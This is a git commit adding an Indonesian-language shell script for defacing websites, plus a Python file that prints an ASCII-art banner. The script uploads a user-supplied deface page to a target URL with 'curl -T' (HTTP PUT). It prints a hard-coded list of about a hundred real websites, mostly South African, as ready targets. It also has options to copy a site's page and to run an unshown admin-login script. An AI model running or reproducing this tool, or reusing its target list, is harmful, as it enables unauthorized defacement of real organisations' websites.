ee7df3b10d3ad5133ed6974fd559b95e530bbbf2
R133F <48719300+R133F@users.noreply.github.com>
2019-06-01 00:48:40 -0400

    Add files via upload

---
+++ depes.sh
@@ -0,0 +1,242 @@
+#usr/!/sh
+Cy='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+e='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+
+clear
+
+python2 op.py
+
+#Nahh loo mau ngapain luu
+#Jangan recode njirr
+#Gua begadang buatnya lu seenaknya recode
+#Hargain dikit lahh makernya :,(
+
+
+echo $i"S C R I P T  B . Y  R I E E F  G A N Z  :V"
+echo $me"____________________________________________"
+echo $me"|"$ku"THANKS TO RIEF THE SCRIPT MAKER"$me"           |"
+echo $me"|"$ku"THANKS TO MR.BR1NG4S The WEB HUNTER "$me"      |"
+echo $me"|"$ku"SCRIPT TEBAS INDEX TARGET "$me"                |"
+echo $me"|"$ku"JANGAN LUPA SUBSCRIBE CHANNEL KU YAK ^_^"$me"  |"
+echo $me"|"$ku"Y O U T U B E = Bloody Gaming71"$me"           |"
+echo $me"|"$ku"F A C E B O O K = Riee EFF "$me"               |"
+echo $me"|"$ku"Makasih Atas support kelean "$me"              |"
+echo $me"|"$i"TEAM = NEWBIE EXPLOITERS "$me"                 |"
+echo $me"|"$e"T H E  N E X T  I N D O N Y M O U S "$me"      |"
+echo $pur"========================================"
+echo $me"1."$i"TEBAS INDEXNYA GAYN"
+echo $me"2."$i"NYOLONG SC "
+echo $me"3."$i"ADMIN LOGIN"
+echo $me"0."$i"EXIT/OUT"
+echo "❲╭──❲༒PILIH NOMER BERAPA༒❳"
+read -p"❲╰─> " pil
+
+if [ $pil = 1 ]
+then
+clear
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+clear
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+clear
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+clear
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+clear
+sleep 2
+echo $i"LOADING ! ........"
+sleep 1
+echo $e"LOADING ! ........"
+sleep 2
+echo $me"W A R N I N G ! "
+echo $i"PASTIKAN SCRIPT DEFACEMU"
+echo $i"BERADA DI MEMORY INTERNAL "
+echo $e"❲╭──❲Masukan script Defacemu❳"
+read -p"❲╰─> " sc
+echo $i"NIH SC MU = "$sc
+sleep 1
+echo $i"GA ADA TARGET ?, SILAHKAN TULIS = target "
+echo $i"❲╭──❲Website TARGET❳"
+read -p"❲╰─> " web
+curl -T /storage/emulated/0/$sc $web
+echo $me"KALAU ADA BANYAK TULISAN ERROR BERARTI WEBMU GAK VULN "
+echo $i"TAPI KALAU GA ADA TULISAN APA APA"
+echo $i"SELAIN TULISAN INI BERARTI WEB MU BERHASIL DI TEBAS "
+echo $i"INI WEBMU SILAHKAN DI CHECK SENDIRI GAN = "$web
+fi
+if [ $web = target ]
+then
+clear
+echo $i"http://bitsandpieces.co.za
+http://scnc.co.za
+http://control.co.za
+http://ayk.co.za
+http://colourfactory.co.za
+http://floralandfresh.co.za
+http://handj.co.za
+http://mestern.co.za
+http://8x8.co.za
+http://inlislitev2.perpusnas.go.id
+http://montdestin.com
+http://bitsandpieces.co.za
+http://cblandscapes.co.za
+http://windmillsandporcupines.co.za
+http://scnc.co.za
+http://contsol.co.za
+http://consultec.co.za
+http://colourfactory.co.za
+http://ayk.co.za
+http://daretogowildafrica.co.za
+http://floralandfresh.co.za
+http://foodconsult.co.za
+http://itsengineering.co.za
+http://hybriddevelopments.co.za
+http://holotropicbreathwork.co.za
+http://hanover-cs.co.za
+http://handj.co.za
+http://lwrm.co.za
+http://lubbestrust.co.za
+http://lpenterprises.co.za
+http://kwalitycommodities.co.za
+http://mestern.co.za
+http://megro.co.za
+http://bitpc.co.za
+http://butterflowers.co.za
+http://beeit.co.za
+http://esfml.com
+http://bee-it.co.za
+http://mc3qs.com
+http://marjoriebresler.com
+http://naturaleyeimages.com
+http://my-resume.biz
+http://mpark.co.za
+http://montdestin.com
+http://africa-one.co.za
+http://ads247.co.za
+http://accelerate-kids.co.za
+http://8x8.co.za
+http://aaglcapetown2013.org.za
+http://allpaint.co.za
+http://andrewswebcorner.co.za
+http://applebyguesthouse.com
+http://atlanticphysio.co.za
+http://page31.co.za
+http://vaigaidigitals.com
+http://systemshouse.co.za
+http://www.studentsonline.co.za
+http://lucaniphysio.co.za
+http://www.onboardpublications.co.za
+http://www.oilandclay.co.za
+http://www.aquafitness.za.net
+http://www.helderbergit.co.za
+http://www.pipelinetape.co.za
+http://www.drcrsaexpress.co.za
+http://officeelf.co.za
+http://troop-1539.org
+http://happy.mikikk.co.jp
+http://www.alfunctiondesigns.co.za
+http://mix007.co.za
+http://spyroom.co.za
+http://sportspod.co.za
+http://southernafricablog.com
+http://stand66.com
+http://tapifare.com
+http://tankertech.co.za
+http://tcnig.co.za
+http://tcmgroup.co.za
+http://tressor.co.za
+http://trafficam.co.za
+http://tuthukani.co.za
+http://nyarhi.co.za
+http://digishop.co.za
+http://elinemsa.co.za
+http://disucctv.co.za
+http://www.cai.co.za
+http://tirupurjobs.net
+http://inlislitev3.perpusnas.go.id
+http://clcooling.co.za
+http://sublimeconfectionery.co.za
+http://gogreenplumbing.co.za
+http://golfbuzz.co.za
+http://grupo-cma.com
+http://inkspot.co.za
+http://kgarebana.co.za
+http://ittrader.co.za
+http://hellomobile.mobi
+http://homebuzz.co.za
+http://gordonhoward.co.za
+http://democonstruction.co.za
+http://chasingfantasia.co.za
+http://litehouse.co.za
+http://ldata.co.za
+http://lunique.co.za
+http://chillibitez.co.za
+http://cmweb.co.za/index.html
+http://essentialtours.com
+http://entitledvip.com
+http://frankadesign.com
+http://forget-me-not.co.za
+http://findpersonnel.co.za
+http://everythingdating.co.za "
+echo $i"❲╭──❲Website TARGET❳"
+read -p"❲╰─> " web
+curl -T /storage/emulated/0/$sc $web
+echo $me"KALAU ADA BANYAK TULISAN ERROR BERARTI WEBMU GAK VULN "
+echo $i"TAPI KALAU GA ADA TULISAN APA APA"
+echo $i"SELAIN TULISAN INI BERARTI WEB MU BERHASIL DI TEBAS "
+echo $i"INI WEBMU SILAHKAN DI CHECK SENDIRI GAN = "$web
+fi
+
+if [ $pil = 2 ]
+then
+clear
+read -p"WEB TARGET= " col
+read -p"NAMA HASIL (contoh.html) = " has
+curl -o $has $col
+mv $has -f /sdcard
+echo $i"SC NYA DAH DI COLONG SILAHKAN CEK MEMORY INTERNAL ANDA"
+fi
+
+if [ $pil = 3 ]
+then
+clear
+python2 ADM.py
+fi
+
+if [ $pil = 0 ]
+then
+clear
+sleep 1
+echo $i"M A K A S I H  D A H  P A K A I  T O O L S  S A Y A "
+sleep 2
+echo $i"S C R I P T  B Y. R I E F  G A N Z :V "
+fi
+
+
---
+++ op.py
@@ -0,0 +1,64 @@
+#green="\033[32;1m"
+#yellow="\033[33;1m"
+#indigo="\033[34;1m"
+#red="\033[35;1m"
+#purple="\033[37;1m"
+#cyan="\033[36;1m"
+#white="\033[39;1m"
+
+print """\033[33;1m`---/:-:/+++- .++/:---..`
+                                                 .:/o/-:+yyy:``:sy/`  -/ssssssss+:`
+                                          .:/:` `//os`   oyy:  `yo      +s/````-+s+`    .`
+                                      ./osyo/ss`    --   +yyo  `y-      os`     `os:  `ooo+:-`
+                                   ./syyo:.` -ys.    /-  +o-y: -y`     `s/      .ss-   `-:+oso/-`
+                                `:syy+:`      -o:    .s- :+ ss`/y      :sso+/::+so-       +ooooo++`
+                                oysys`   `o+          :s./o :y-so      +s//++sss:`       :s+.``-//
+                           .-+. ```./s.   -y+          ++:y` ssy+     `s/    .os.      `/s/`       /+:.
+                         -oyhy`      -s/./syy+`  .:`   `ssy. +yy+     .s`     /s.     `+o-         .ooo+.
+                        :hhssho.      .ooos/-oo` .yo    -yy: .yy/     /+     `o+     .+o.         ./+-:oo/.
+                        `-. `-oy+.     `+y:   -`  :y-    +y/  oy-   .+so:-.-/o:`    .o+`        .//.   `:oo/`
+                    .+so/-.`   ./s+`     :s/`    `:y+    ./-.`-:`.`.://++o++:. ``  .o+`       `/+/`   `  `/o+-
+                   :hhhhhhyso:.` `+o/`    `++..:osys//oyyyhhs/+:::-/sdysyo+-.``+o++s+`      `:+o/o/.-//    -oo`
+                   -os+/shy/:/+++/-.:+-    `yyyysshddmddhNmhy+//hhhdNmoydddmdhs+/soss+.   `-+:``-os+/.   .:+/-
+                         ./so/.`.-/++++o-`  +hddmmddddNhydNNmh+/yyNNNm/+dNNmmmmNdy//+/`.-:+:`  `:+:`    .+/.
+                            .:o+-`  .-/syo`:yNNNNmdhssysddhmNmhy/:sNNmoyddysooosyyhso-`+ss+`   `-`       `
+                               .:++-``.`.odNNNmdy+:-----:/oyhyyyhs/hmhyyssyyhdmdyo/+yso-./oo:`  `-/:
+                                  ./ssy+ymdmds/:://///:::---:/+oosmmhyyyyyyyssdNNmdy/:+y+`-oo+//+/-`
+                                   `syyddmh+-:/+ooossssyyyyyyyyyddyo///+ydmmmdsodMMNms+ohys/-:-.
+                                    .sNmh+--/ooo-/oyyhhhyso++oydNdhyysso//odNmmhohMMNNds+sys:
+                                   `hNmy/://+os::oys/:----::/oosmNNNmmmmdho/yNNNmsdNMMNNd++h+
+                                   yNNyosyhyyy/:oy-.-/+oosyhdhhdNNNNNNNNNmmdodNNNdsdNNMMNmohN/
+                                  +NNhsdmNNdh+:sh::ohhhhddmmmmddNNNMMNNNNNNNyyNNNNyhmmdNNNmshd.
+                                 `mNdhmNNNNNd-od/-+ydmmmmmmmmdhdNNNNNMNNNNNNysNNNNdyhddshNNdymo
+                                 oNmdmNNNNNmy/s+.ohdhhdNNmmhs+:oNNNNNNNNNNNNysmNNNNhyosyhsdNysy.
+                                 hhshNNNNNNds/o-/yds+yyoohdhhh+/mmmhyhyhNNNNyyhNNNNyossyyhhdNhh/
+                                `mmmddmNNNmho++-shhhys+hdNdsyydsdmysshNmmNNNyhsdNNNhyo+smNmdmmy/
+                                .hddmdmmmNmhyso:yhdddo+ydNNNdsymdhodNmNmhNNmsdydmNNdoyyhddNmhyo+
+                                `NmdyddNmdNddmd+hdmmmhsdNmdmNmydhhmNmdmNdhmdydsddNNddmmmmdmmddmy
+                                 mNmyhddhymNmmNyddmddh+/hmNmmmo+o+dmNNmy//ddhsdsdNmmNNNNNdddmddo
+                                 sNhhydhhhdNNdhdhyy+/:o+ymmmmyo/+/sdmmdy-+dddsmydmmmNNNmmmhhddm-
+                             ``-+syymmyyhhydNhyyosso+ohy+dmyoysssssoymh/:ymhddyhsymmmmmmmmmhhds-::---.   `...`
+               //-..-:://:/:--.`:ssyhdmmysyyydddhysddmmmssdmhhmhhdhydh+:+yoyhsyhddmhyhddmmmdds-++:.``` .//:--://.
+               +ss:--.``+o+..-`  /sshdddydddmdhsyhdmNNNmyysdsoyddyood++hyhdds:----/+sssdddddy:`++.    -+/`    `/+.
+               `os.   .:++/:..``.:+:sdmhhhhhddmmNNNNNNNmsysyds+/+oshy/yo+hNmho////+ooooysoyys` `://:-:+:`      `++://.
+                :s+   ````   `::-``.oossydmmmmmmmmmhyddyoydydddhddddohs+sdmmmmmmNmmmdddyyhh+``    `...``      `:+:.//.
+              `//os:..:/:         `/++:ososmNNNNNy:--/sho/sdhddmmddyhh+/hmmmmmNNNNNNNmdhss//+/:::-.`    `-::-/++-`--`
+              -s+-/+//:.`       `:/.``:oyhdmmmmd+..:+ydhyo+ohhyyyssys/+syy++hmNNNNNNmmNms:/+:````-+/`     ``.-::`
+               .//`..`        `-o+-:://++omNmmy::ohmmdmmmmsohyyddy+so+yNmh:..sNNNNNNmNm+`:++:`    /++:-.`` -/:`
+                 ` -oo/:::///+o+/:-.````.:/shsshmNmmmmmmmNmhsysyyshhyyhNmd-``.yNNNNmh+-.````.-:.`:++-..::///++-
+                    -os+-..-o+-`        -+o+/+ymmmmmmmmNNNNy++ssoyNmmmmmmd:.--:+hho:.:+/-:.`  `.:++.     `.--.`
+                     .-```-o+`       `./:``:o:`.+hdmmNNNmy+y--::-smmdmds:::---..``./++-` `-:`    .:/:`   ``
+                       :ooo/`       .+:.    o/ .+ooooshhoo./..-.-hmmds-`:ss:`.-:.`//+.  .. `       `.:::/+:
+                       `+ss:      ./oo-`  `/+. `/o/+- ```-``````:soo:.```-::/+-./-``.:` `:/.    .`    .++/.
+                        `:+/`   .++--/o++///` `:+.``     `-//+:`  //++++`/:..+. ./:` `:-./++:.  :/:`  .+:`
+                          `.//-++-`   ....`  `:o-`      `/+::/+/  :::o:.`./  .+` `.`  `-/+:..:.  `/+. ..
+                           `-+oo-         .//+oo++`    `/+.   .o.   `o-   :`  :+`       -+-`     ./+-.+.
+                             `-+-         `:oo-...     :o.     +-    /:   ``   :/`       .//` `./+//:+/`
+                                           /o-        `o:      //    :+        `//`        :+//+:.``-.`
+                                       .--/o:`    `/. -o`      /+    .o`        `+:`       :++:`
+                                      .+oooo-.`   /o` /+       +/    `o:         .o/--:    `.`
+                                        .-:+oo+:::o/  +o-     `o-     ++        .:o++/-`
+                                            `-//++/`  :oo:` `./+`     /o.`.-    //:-.`
+                                                 `     :+o+/++/`  .///ooo+++`      .++-
+                                                        `-::-.`   `:--:o-.::        :/+
+                                                                       +++/.         :: """
